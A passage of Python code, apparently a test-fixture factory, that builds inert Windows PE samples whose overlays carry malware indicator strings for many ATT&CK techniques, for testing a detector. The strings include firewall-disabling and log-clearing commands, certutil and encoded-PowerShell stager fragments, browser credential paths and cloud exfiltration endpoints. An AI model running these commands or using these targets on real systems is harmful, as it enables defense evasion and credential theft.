    VirtualAllocEx, WriteProcessMemory, SetThreadContext, ResumeThread; в оверлее — XOR-шеллкод.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay = _INJECTION_CHAIN_APIS + _SHELLCODE_XOR
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay)
    return out_path


# Stealer: Run + DGA-подобные домены (энтропия > 4.0) + DoH
def _dga_like_domains_entropy() -> bytes:
    """Домены с высокой энтропией (DGA-подобные), без нулевых байтов в середине."""
    import random
    random.seed(0x5E41)
    chars = "abcdefghijklmnopqrstuvwxyz"
    domains = []
    for _ in range(6):
        length = random.randint(8, 14)
        domains.append("".join(random.choices(chars, k=length)) + ".tk\x00")
    return "".join(domains).encode("ascii")


_STEALER_OVERLAY = (
    b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
    b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
    b"https://cloudflare-dns.com/dns-query\x00"
    b"https://dns.google/resolve\x00"
    b"application/dns-message\x00"
)


def build_stealer_persistence_sample(out_path: Path) -> Path:
    """
    Бинарник со связкой stealer: запись в Run для автозагрузки, DGA-подобные домены
    (энтропия > 4.0), строки DoH для DNS-over-HTTPS.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay = _dga_like_domains_entropy() + _STEALER_OVERLAY
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay)
    return out_path


# Advanced Phishing: document.pdf.exe с иконкой PDF и стаджер-строками в ресурсах/оверлее
_MASQUERADE_STAGER_OVERLAY = (
    b"certutil -urlcache\x00"
    b"powershell -enc\x00"
    b"powershell -EncodedCommand\x00"
)


def build_complex_masquerade_sample(out_path: Path) -> Path:
    """
    Файл document.pdf.exe: PE с именем под документ, строки certutil -urlcache и
    powershell -enc в оверлее (имитация стаджера). Иконка PDF не эмулируется — детекция по имени.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay = _MASQUERADE_STAGER_OVERLAY
    out_path.parent.mkdir(parents=True, exist_ok=True)
    # Сохраняем как document.pdf.exe для триггера маскировки по имени
    pdf_exe_path = out_path.parent / "document.pdf.exe"
    pdf_exe_path.write_bytes(bytes(data) + overlay)
    return pdf_exe_path


# --- Artifact Factory v0.1.1 — Specialized Malware Types ---

# Ransomware: поиск файлов + BCrypt API + зашифрованный оверлей
_RANSOMWARE_FILE_SEARCH = (
    b"FindFirstFileA\x00"
    b"FindNextFileA\x00"
    b"FindClose\x00"
    b"*.doc\x00"
    b"*.docx\x00"
    b"*.xlsx\x00"
)
_RANSOMWARE_BCRYPT = (
    b"BCryptEncrypt\x00"
    b"BCryptDecrypt\x00"
    b"BCryptGenerateSymmetricKey\x00"
    b"bcrypt.dll\x00"
)
_RANSOMWARE_OVERLAY_KEY = 0x5A
_RANSOMWARE_OVERLAY_PLAIN = bytes([0x90, 0x90, 0xCC, 0xC3, 0x00] * 32)  # имитация зашифрованного блока
_RANSOMWARE_OVERLAY_ENC = bytes(b ^ _RANSOMWARE_OVERLAY_KEY for b in _RANSOMWARE_OVERLAY_PLAIN)


def build_ransomware_sample(out_path: Path) -> Path:
    """
    PE с цепочкой «Поиск файлов + BCrypt API» и зашифрованным оверлеем (XOR).
    Имитирует поведение шифровальщика: FindFirstFile/FindNextFile + BCrypt*.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay = _RANSOMWARE_FILE_SEARCH + _RANSOMWARE_BCRYPT + _RANSOMWARE_OVERLAY_ENC
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay)
    return out_path


# Spyware/Keylogger: SetWindowsHookEx + пути к профилям браузеров
_SPYWARE_HOOK = (
    b"SetWindowsHookExA\x00"
    b"SetWindowsHookExW\x00"
    b"WH_KEYBOARD\x00"
    b"user32.dll\x00"
)
_BROWSER_PROFILE_PATHS = (
    b"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\x00"
    b"AppData\\Roaming\\Mozilla\\Firefox\\Profiles\x00"
    b"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\x00"
    b"AppData\\Local\\BraveSoftware\\Brave-Browser\x00"
    b"Cookies\x00"
    b"Web Data\x00"
)


def build_spyware_keylogger_sample(out_path: Path) -> Path:
    """
    PE с импортом SetWindowsHookEx и путями к профилям браузеров в строках
    (Chrome, Firefox, Edge, Brave — Login Data, Cookies, Web Data).
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay = _SPYWARE_HOOK + _BROWSER_PROFILE_PATHS
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay)
    return out_path


# Crypto miner: протокол Stratum + высокая энтропия (вычислительные ядра)
_STRATUM_STRINGS = (
    b"stratum+tcp://\x00"
    b"mining.submit\x00"
    b"mining.notify\x00"
    b"mining.authorize\x00"
    b"job_id\x00"
    b"nucleus\x00"
    b"extranonce\x00"
)


def build_crypto_miner_sample(out_path: Path) -> Path:
    """
    Бинарник со строками протокола Stratum и высокоэнтропийным оверлеем
    (имитация нагрузки на вычислительные ядра).
    """
    import os
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    high_entropy = os.urandom(4096)
    overlay = _STRATUM_STRINGS + high_entropy
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay)
    return out_path


# --- 10 новых техник MITRE ATT&CK (APT-style) ---

# T1120 Peripheral Device Discovery
_T1120_OVERLAY = (
    b"SetupDiGetClassDevsA\x00"
    b"SetupDiGetClassDevsW\x00"
    b"SetupDiEnumDeviceInfo\x00"
    b"GUID_DEVCLASS_USB\x00"
    b"GUID_DEVCLASS_MEDIA\x00"
    b"setupapi.dll\x00"
)


def build_t1120_peripheral_discovery(out_path: Path) -> Path:
    """T1120: Поиск периферийных устройств (USB/PCI) через SetupDiGetClassDevs."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1120_OVERLAY)
    return out_path


# T1012 Query Registry
_T1012_OVERLAY = (
    b"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\x00"
    b"RegOpenKeyExA\x00"
    b"RegQueryValueExA\x00"
    b"RegEnumKeyExA\x00"
    b"CurrentVersion\x00"
    b"ProductName\x00"
    b"advapi32.dll\x00"
)


def build_t1012_query_registry(out_path: Path) -> Path:
    """T1012: Сбор информации о системе через массовое чтение ключей реестра."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1012_OVERLAY)
    return out_path


# T1083 File and Directory Discovery
_T1083_OVERLAY = (
    b"FindFirstFileW\x00"
    b"FindNextFileW\x00"
    b"*.docx\x00"
    b"*.pdf\x00"
    b"*.key\x00"
    b"Users\\%s\\Documents\x00"
    b"\\AppData\\Roaming\x00"
)


def build_t1083_file_discovery(out_path: Path) -> Path:
    """T1083: Рекурсивный поиск файлов по маскам в пользовательских директориях."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1083_OVERLAY)
    return out_path


# T1113 Screen Capture
_T1113_OVERLAY = (
    b"BitBlt\x00"
    b"GetDC\x00"
    b"CreateCompatibleDC\x00"
    b"GetDesktopWindow\x00"
    b"gdi32.dll\x00"
    b"user32.dll\x00"
)


def build_t1113_screen_capture(out_path: Path) -> Path:
    """T1113: Захват экрана через GDI32 (BitBlt, GetDC)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1113_OVERLAY)
    return out_path


# T1057 Process Discovery
_T1057_OVERLAY = (
    b"CreateToolhelp32Snapshot\x00"
    b"Process32First\x00"
    b"Process32Next\x00"
    b"TH32CS_SNAPPROCESS\x00"
    b"kernel32.dll\x00"
)


def build_t1057_process_discovery(out_path: Path) -> Path:
    """T1057: Листинг процессов через Toolhelp32 API."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1057_OVERLAY)
    return out_path


# T1106 Native API
_T1106_OVERLAY = (
    b"NtCreateSection\x00"
    b"NtMapViewOfSection\x00"
    b"ntdll.dll\x00"
    b"ZwQuerySystemInformation\x00"
    b"LdrLoadDll\x00"
)


def build_t1106_native_api(out_path: Path) -> Path:
    """T1106: Использование ntdll (NtCreateSection и др.) в обход стандартных API."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1106_OVERLAY)
    return out_path


# T1016 System Network Configuration Discovery
_T1016_OVERLAY = (
    b"GetAdaptersInfo\x00"
    b"GetAdaptersAddresses\x00"
    b"IP_ADAPTER_INFO\x00"
    b"iphlpapi.dll\x00"
)


def build_t1016_network_config_discovery(out_path: Path) -> Path:
    """T1016: Обнаружение конфигурации сети (GetAdaptersInfo)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1016_OVERLAY)
    return out_path


# T1049 System Network Connections Discovery
_T1049_OVERLAY = (
    b"GetTcpTable\x00"
    b"GetExtendedTcpTable\x00"
    b"MIB_TCPTABLE\x00"
    b"iphlpapi.dll\x00"
)


def build_t1049_network_connections_discovery(out_path: Path) -> Path:
    """T1049: Обнаружение активных сетевых соединений (GetTcpTable)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1049_OVERLAY)
    return out_path


# T1543.003 Windows Service
_T1543_003_OVERLAY = (
    b"CreateServiceA\x00"
    b"OpenSCManagerA\x00"
    b"ChangeServiceConfigA\x00"
    b"advapi32.dll\x00"
)


def build_t1543_003_windows_service(out_path: Path) -> Path:
    """T1543.003: Создание/модификация служб Windows (CreateServiceA)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1543_003_OVERLAY)
    return out_path


# T1140 Deobfuscation/Decoding
_T1140_OVERLAY = (
    b"VirtualAlloc\x00"
    b"RtlDecompressBuffer\x00"
    b"XOR\x00"
    b"decode\x00"
    b"decrypt\x00"
    b"base64\x00"
    b"ExpandEnvironmentStringsA\x00"
)


def build_t1140_deobfuscation(out_path: Path) -> Path:
    """T1140: Самораспаковка / XOR-декодирование (строки в рантайме)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1140_OVERLAY)
    return out_path


# --- 10 техник: UAC Bypass, Modify Registry, File Deletion, Time Discovery, etc. ---

# T1548.002 Bypass User Account Control (fodhelper / eventvwr via registry)
_T1548_002_OVERLAY = (
    b"fodhelper.exe\x00"
    b"eventvwr.exe\x00"
    b"ms-settings\x00"
    b"Software\\Classes\\ms-settings\\shell\\open\\command\x00"
    b"RegSetValueExA\x00"
    b"\\\\ComputerDefaults\x00"
    b"advapi32.dll\x00"
)


def build_t1548_002_uac_bypass(out_path: Path) -> Path:
    """T1548.002: Обход UAC через fodhelper/eventvwr и реестр (ms-settings)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1548_002_OVERLAY)
    return out_path


# T1112 Modify Registry (UAC/Defender policies)
_T1112_OVERLAY = (
    b"Policies\\Microsoft\\Windows Defender\x00"
    b"DisableAntiSpyware\x00"
    b"EnableLUA\x00"
    b"ConsentPromptBehaviorAdmin\x00"
    b"RegSetValueExW\x00"
    b"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\x00"
    b"Real-Time Protection\x00"
)


def build_t1112_modify_registry(out_path: Path) -> Path:
    """T1112: Модификация реестра (отключение UAC/Defender через Policies)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1112_OVERLAY)
    return out_path


# T1070.004 File Deletion (self-deletion)
_T1070_004_OVERLAY = (
    b"cmd.exe\x00"
    b"/c del \x00"
    b"MoveFileExA\x00"
    b"MOVEFILE_DELAY_UNTIL_REBOOT\x00"
    b"DeleteFileA\x00"
    b"kernel32.dll\x00"
)


def build_t1070_004_file_deletion(out_path: Path) -> Path:
    """T1070.004: Самоудаление (cmd /c del или MoveFileEx DELAY_UNTIL_REBOOT)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1070_004_OVERLAY)
    return out_path


# T1124 System Time Discovery (sandbox stall)
_T1124_OVERLAY = (
    b"GetSystemTime\x00"
    b"GetTickCount\x00"
    b"GetTickCount64\x00"
    b"kernel32.dll\x00"
)


def build_t1124_system_time_discovery(out_path: Path) -> Path:
    """T1124: Задержка по времени (GetSystemTime/GetTickCount в циклах, обход песочниц)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1124_OVERLAY)
    return out_path


# T1082 System Information Discovery
_T1082_OVERLAY = (
    b"GetComputerNameA\x00"
    b"GetComputerNameW\x00"
    b"GetVersionExA\x00"
    b"GetUserNameW\x00"
    b"kernel32.dll\x00"
)


def build_t1082_system_info_discovery(out_path: Path) -> Path:
    """T1082: Сбор данных об имени ПК, пользователе и версии ОС."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1082_OVERLAY)
    return out_path


# T1573 Encrypted Channel (AES/ChaCha20 + network)
_T1573_OVERLAY = (
    b"ChaCha20\x00"
    b"AES-256-GCM\x00"
    b"BCryptEncrypt\x00"
    b"InternetOpenA\x00"
    b"WinHttpOpen\x00"
    b"ws2_32.dll\x00"
)


def build_t1573_encrypted_channel(out_path: Path) -> Path:
    """T1573: Нестандартное шифрование трафика (AES/ChaCha20 + сетевые импорты)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1573_OVERLAY)
    return out_path


# T1005 Data from Local System (%APPDATA%, %TEMP%, messengers)
_T1005_OVERLAY = (
    b"%APPDATA%\x00"
    b"%TEMP%\x00"
    b"Telegram Desktop\x00"
    b"Signal\x00"
    b"tdata\x00"
    b"Roaming\x00"
)


def build_t1005_data_local_system(out_path: Path) -> Path:
    """T1005: Поиск данных в %APPDATA%, %TEMP%, мессенджеры (Telegram, Signal)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1005_OVERLAY)
    return out_path


# T1518.001 Security Software Discovery
_T1518_001_OVERLAY = (
    b"WbemClient\x00"
    b"Win32_Product\x00"
    b"C:\\Program Files\\Windows Defender\x00"
    b"MpCmdRun.exe\x00"
    b"MsMpEng\x00"
)


def build_t1518_001_security_software_discovery(out_path: Path) -> Path:
    """T1518.001: Перечисление антивирусов (WMI, пути Windows Defender)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1518_001_OVERLAY)
    return out_path


# T1090 Proxy
_T1090_OVERLAY = (
    b"InternetSetOptionA\x00"
    b"INTERNET_OPTION_PROXY\x00"
    b"WinInet\x00"
    b"proxy\x00"
    b"wininet.dll\x00"
)


def build_t1090_proxy(out_path: Path) -> Path:
    """T1090: Настройка системного прокси для сокрытия C2."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1090_OVERLAY)
    return out_path


# T1218.011 Rundll32 (LOLBins)
_T1218_011_OVERLAY = (
    b"rundll32.exe\x00"
    b"shell32.dll\x00"
    b"Control_RunDLL\x00"
    b"CreateProcessA\x00"
    b"#1\x00"
)


def build_t1218_011_rundll32(out_path: Path) -> Path:
    """T1218.011: Запуск логики через rundll32.exe с параметрами (LOLBins)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1218_011_OVERLAY)
    return out_path


# --- 10 техник: Local Storage, Cookie Steal, CLI Capture, Email, Staging, DNS, Cloud, Encoding, Uninstall, Winlogon ---

# T1005 Data from Local System (archives, VPN, KeePass)
_T1005_SENSITIVE_OVERLAY = (
    b"*.zip\x00"
    b"*.7z\x00"
    b"*.ovpn\x00"
    b"*.kdbx\x00"
    b"KeePass\x00"
    b"OpenVPN\x00"
    b"FindFirstFileW\x00"
)


def build_t1005_sensitive_storage(out_path: Path) -> Path:
    """T1005: Поиск/чтение архивов .zip/.7z, конфигов VPN .ovpn, баз KeePass .kdbx."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1005_SENSITIVE_OVERLAY)
    return out_path


# T1539 Steal Web Session Cookie
_T1539_OVERLAY = (
    b"Cookies\x00"
    b"Login Data\x00"
    b"Chrome\\User Data\\Default\x00"
    b"Edge\\User Data\\Default\x00"
    b"Firefox\\Profiles\x00"
    b"cookies.sqlite\x00"
)


def build_t1539_steal_cookie(out_path: Path) -> Path:
    """T1539: Доступ к Cookies и Login Data в профилях Chrome/Edge/Firefox."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1539_OVERLAY)
    return out_path


# T1056.004 CLI Input Capture
_T1056_004_OVERLAY = (
    b"NtQueryInformationProcess\x00"
    b"ProcessCommandLineInformation\x00"
    b"Win32_Process\x00"
    b"CommandLine\x00"
    b"WbemClient\x00"
    b"ntdll.dll\x00"
)


def build_t1056_004_cli_capture(out_path: Path) -> Path:
    """T1056.004: Перехват аргументов командной строки (WMI / NtQueryInformationProcess)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1056_004_OVERLAY)
    return out_path


# T1114.001 Email Collection (Outlook, Thunderbird)
_T1114_001_OVERLAY = (
    b"*.pst\x00"
    b"*.ost\x00"
    b"Outlook\x00"
    b"Thunderbird\x00"
    b"ImapMail\x00"
    b"POP3\x00"
)


def build_t1114_001_email_collection(out_path: Path) -> Path:
    """T1114.001: Поиск почтовых файлов Outlook (.pst, .ost) и Thunderbird."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1114_001_OVERLAY)
    return out_path


# T1074.001 Data Staged (hidden dir in %LOCALAPPDATA%)
_T1074_001_OVERLAY = (
    b"%LOCALAPPDATA%\x00"
    b".cache\x00"
    b"FILE_ATTRIBUTE_HIDDEN\x00"
    b"CreateDirectoryW\x00"
    b"SetFileAttributesW\x00"
)


def build_t1074_001_data_staging(out_path: Path) -> Path:
    """T1074.001: Создание скрытой директории в %LOCALAPPDATA% для стейджинга данных."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1074_001_OVERLAY)
    return out_path


# T1071.004 DNS (tunneling / data in subdomains)
_T1071_004_OVERLAY = (
    b"DnsQuery_A\x00"
    b"DnsQuery_W\x00"
    b"dnsapi.dll\x00"
    b"TXT\x00"
    b"AAAA\x00"
    b"subdomain\x00"
    b"payload.\x00"
)


def build_t1071_004_dns_tunneling(out_path: Path) -> Path:
    """T1071.004: Передача данных через DNS-запросы (туннелирование, данные в субдоменах)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1071_004_OVERLAY)
    return out_path


# T1567.002 Exfiltration to Cloud (Mega, Telegram Bot, Discord)
_T1567_002_OVERLAY = (
    b"mega.nz\x00"
    b"api.telegram.org\x00"
    b"discord.com/api/webhooks\x00"
    b"bot\x00"
    b"token\x00"
    b"InternetOpenA\x00"
)


def build_t1567_002_cloud_exfil(out_path: Path) -> Path:
    """T1567.002: Строки API облаков (Mega, Telegram Bot API, Discord Webhooks) + сеть."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1567_002_OVERLAY)
    return out_path


# T1132.001 Data Encoding (Base64/Hex)
_T1132_001_OVERLAY = (
    b"Base64\x00"
    b"Convert.FromBase64String\x00"
    b"hex\x00"
    b"decode\x00"
    b"0x\x00"
    b"CryptStringToBinaryA\x00"
)


def build_t1132_001_encoding(out_path: Path) -> Path:
    """T1132.001: Множественное Base64/Hex кодирование для сокрытия данных."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1132_001_OVERLAY)
    return out_path


# T1012 Query Registry (Uninstall enumeration)
_T1012_UNINSTALL_OVERLAY = (
    b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\x00"
    b"RegEnumKeyExW\x00"
    b"DisplayName\x00"
    b"RegQueryValueExW\x00"
    b"HKEY_LOCAL_MACHINE\x00"
)


def build_t1012_uninstall_enum(out_path: Path) -> Path:
    """T1012: Перечисление установленного ПО через Uninstall."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1012_UNINSTALL_OVERLAY)
    return out_path


# T1547.004 Winlogon Helper DLL
_T1547_004_OVERLAY = (
    b"Winlogon\x00"
    b"Shell\x00"
    b"Userinit\x00"
    b"RegSetValueExA\x00"
    b"software\\microsoft\\windows nt\\currentversion\\winlogon\x00"
)


def build_t1547_004_winlogon(out_path: Path) -> Path:
    """T1547.004: Прописка DLL в Winlogon\\Shell или Userinit."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1547_004_OVERLAY)
    return out_path


# --- 10 техник: Impair Defenses, Firewall, Event Log Clear, IFEO, Security Center, Hidden, Indirect Exec, Root Cert, Phishing UI ---

# T1562.001 Impair Defenses: Disable/Modify Tools (kill AV/EDR)
_T1562_001_OVERLAY = (
    b"MsMpEng.exe\x00"
    b"OpenProcess\x00"
    b"TerminateProcess\x00"
    b"NtTerminateProcess\x00"
    b"Wdfilter\x00"
    b"EDR\x00"
)


def build_t1562_001_impair_tools(out_path: Path) -> Path:
    """T1562.001: Поиск и завершение процессов антивирусов/EDR (MsMpEng.exe и др.)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1562_001_OVERLAY)
    return out_path


# T1562.004 Disable/Modify System Firewall
_T1562_004_OVERLAY = (
    b"netsh\x00"
    b"advfirewall set allprofiles state off\x00"
    b"NetFwProfile\x00"
    b"INetFwPolicy2\x00"
    b"Enable\x00"
)


def build_t1562_004_disable_firewall(out_path: Path) -> Path:
    """T1562.004: Отключение брандмауэра (netsh advfirewall или API)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1562_004_OVERLAY)
    return out_path


# T1070.001 Clear Windows Event Logs
_T1070_001_OVERLAY = (
    b"ClearEventLogA\x00"
    b"wevtutil cl\x00"
    b"Application\x00"
    b"Security\x00"
    b"System\x00"
    b"advapi32.dll\x00"
)


def build_t1070_001_clear_event_logs(out_path: Path) -> Path:
    """T1070.001: Очистка журналов событий (ClearEventLogA, wevtutil cl)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1070_001_OVERLAY)
    return out_path


# T1546.012 IFEO Injection
_T1546_012_OVERLAY = (
    b"Image File Execution Options\x00"
    b"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\x00"
    b"Debugger\x00"
    b"RegSetValueExW\x00"
)


def build_t1546_012_ifeo_injection(out_path: Path) -> Path:
    """T1546.012: Подмена отладчика через Image File Execution Options."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1546_012_OVERLAY)
    return out_path


# T1112 Modify Registry (Security Center / download warnings)
_T1112_SECURITY_CENTER_OVERLAY = (
    b"Security Center\x00"
    b"NotificationsDisabled\x00"
    b"DisableRealtimeMonitoring\x00"
    b"Internet\\ZoneMap\x00"
    b"1806\x00"
    b"RegSetValueExA\x00"
)


def build_t1112_security_center(out_path: Path) -> Path:
    """T1112: Отключение уведомлений Центра безопасности и предупреждений о загрузках."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1112_SECURITY_CENTER_OVERLAY)
    return out_path


# T1564.001 Hidden Files and Directories
_T1564_001_OVERLAY = (
    b"SetFileAttributesA\x00"
    b"FILE_ATTRIBUTE_HIDDEN\x00"
    b"SetFileAttributesW\x00"
    b"0x02\x00"
)


def build_t1564_001_hidden_files(out_path: Path) -> Path:
    """T1564.001: Скрытие файлов/папок через FILE_ATTRIBUTE_HIDDEN."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1564_001_OVERLAY)
    return out_path


# T1564.003 Hidden Window
_T1564_003_OVERLAY = (
    b"CREATE_NO_WINDOW\x00"
    b"SW_HIDE\x00"
    b"CreateProcessA\x00"
    b"STARTF_USESHOWWINDOW\x00"
    b"ShowWindow\x00"
)


def build_t1564_003_hidden_window(out_path: Path) -> Path:
    """T1564.003: Запуск с CREATE_NO_WINDOW/SW_HIDE для скрытия окна."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
